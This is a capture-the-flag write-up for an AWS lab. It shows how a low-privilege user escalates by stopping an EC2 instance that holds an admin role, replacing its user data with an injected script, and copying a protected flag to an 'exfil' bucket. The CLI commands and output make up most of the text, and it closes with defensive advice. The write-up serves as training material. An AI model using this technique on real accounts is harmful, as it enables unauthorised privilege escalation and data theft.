
## Solution

To retrieve the flag, I performed the following steps:

---
a. Attempt to retrieve the flag directly from S3

I first tried to download the flag directly from the S3 bucket, but access was denied.

```bash
> aws s3 cp \
  s3://iam-privesc-ec2-ob6mnd1d-secret-flag/flag.txt \
  - \
  --profile dev_user
```
output:
```bash
download failed: s3://iam-privesc-ec2-ob6mnd1d-secret-flag/flag.txt to - 
An error occurred (403) when calling the HeadObject operation: Forbidden
```

---

b. Review the IAM role attached to the EC2 instance

From the output of terraform apply, I identified the IAM role associated with the target EC2 instance.

```json
"target_ec2_info": {
  "sensitive": false,
  "type": [
    "object",
    {
      "iam_role": "string",
      "instance_id": "string",
      "instance_profile": "string",
      "private_ip": "string",
      "security_group_id": "string",
      "subnet_id": "string"
    }
  ],
  "value": {
    "iam_role": "iam-privesc-ec2-ob6mnd1d-target-ec2-role",
    "instance_id": "i-0de189f5175f09a45",
    "instance_profile": "iam-privesc-ec2-ob6mnd1d-target-ec2-profile",
    "private_ip": "10.0.2.200",
    "security_group_id": "sg-01c7fb02798694006",
    "subnet_id": "subnet-0b5b9e3b62a9ec48e"
  }
}
```

Next, I inspected the policies attached to this role
- reference: https://docs.aws.amazon.com/cli/latest/reference/iam/list-attached-role-policies.html
```bash
> aws iam list-attached-role-policies \
  --role-name iam-privesc-ec2-ob6mnd1d-target-ec2-role
```
- output:
```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "AdministratorAccess",
      "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
    }
  ]
}
```
The EC2 instance has the AdministratorAccess policy attached, which allows full access to other AWS services.

---

c. Stop, modify, and restart the EC2 instance

I tried to stop, modify, and restart the EC2 instance to inject a malicious script.
- Sinces I am not sure if dev_user has the privilage.
- Command reference: https://docs.aws.amazon.com/cli/latest/reference/ec2/

To ensure the user data script executes on every reboot, We need #cloud-boothook
- reference: https://docs.aws.amazon.com/linux/al2/ug/amazon-linux-cloud-init.html

Stop the instance `aws ec2 stop-instances --instance-ids i-0de189f5175f09a45 --profile dev_user`
- Output:
```json
{
  "StoppingInstances": [
    {
      "InstanceId": "i-0de189f5175f09a45",
      "CurrentState": {
        "Code": 64,
        "Name": "stopping"
      },
      "PreviousState": {
        "Code": 16,
        "Name": "running"
      }
    }
  ]
}
```

Modify the instance user data.
- Since the EC2 instance has AdministratorAccess, I modified the user data to copy the flag into a publicly accessible S3 bucket.
```bash
base64 -i userdata.sh -o userdata.b64

aws ec2 modify-instance-attribute \
  --instance-id i-0de189f5175f09a45 \
  --attribute userData \
  --value file://userdata.b64
  --profile dev_user
```

Restart the instance
```bash
aws ec2 start-instances \
  --instance-ids i-0de189f5175f09a45 \
  --profile dev_user
```


d. Retrieve the flag

After the instance rebooted and executed the user data script, I was able to retrieve the flag from the exfiltration bucket.
```
aws s3 cp \
  s3://iam-privesc-ec2-ob6mnd1d-exfil-bucket/flag.txt \
  - \
  --profile dev_user
```

## Reflection

### What was your approach?

While direct access to the target EC2 and S3 bucket was restricted, but we have the ability to stop, modify, and start an EC2 instance. I tried modify the EC2 instance to inject a malicious script which copy the flag to public access bucket.

---

### What was the biggest challenge?

The biggest challenge was understanding how to leverage the stop and start permissions granted to the `dev_user` account to achieve code execution on the EC2 instance.
While the hint suggested that rebooting the instance was key, it was not immediately clear how to ensure that a user data script would be executed during the reboot process, especially without direct access to the instance or SSM.

---

### How did you overcome the challenges?

I spent some time researching how EC2 handles initialization and reboot behavior, and tested it several times.

---

### What led to the breakthrough?

The breakthrough came when I was finally able to copy the flag to a bucket that I could access.

---

### On the blue side, how can the learning be used to properly defend important assets?

- Use least-privilege principles to limit instance control actions.
    - Avoid granting IAM users permissions to modify EC2 instance attributes unless absolutely necessary.
- Monitor and alert on changes to EC2 user data.
